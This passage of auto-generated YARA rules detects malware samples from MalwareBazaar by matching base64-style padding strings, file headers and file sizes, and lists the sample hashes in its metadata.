      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 2 times */
      $s5 = "AAACA6AAdA4" ascii
      $s6 = "AAACA6AAdA" ascii
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x3d3d ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142_4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56_13 {
   meta:
      description = "evidences - from files 1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142.unknown, 4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca.unknown, 73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678.unknown, f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-08"
      hash1 = "1bc7418009f735fbf6670730f0df5be418dd7fb7bf7e79b36349f3b17d812142"
      hash2 = "4ca79501090c483ecbbe8e49eacb86ddae8a21a78f441e6c87d9fa2b56b68bca"
      hash3 = "73d070017bc166be94cc5edbf254add8f1ad2122fb1a3498f232db7217227678"
      hash4 = "f478945bb2b09deed546a6fcbdc64e362092e26ef57d4f6f4cd6dc0b4e48aff0"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s2 = "BAAAAAAAAA" ascii
      $s3 = "EAAACCAAAAAAAAAAAAAAACAAA" ascii
      $s4 = "AAAAAAAAAAAAAA" ascii /* Goodware String - occured 3 times */
      $s5 = "05CAAAAAAAAAAAAAA" ascii
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x3d3d ) and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}
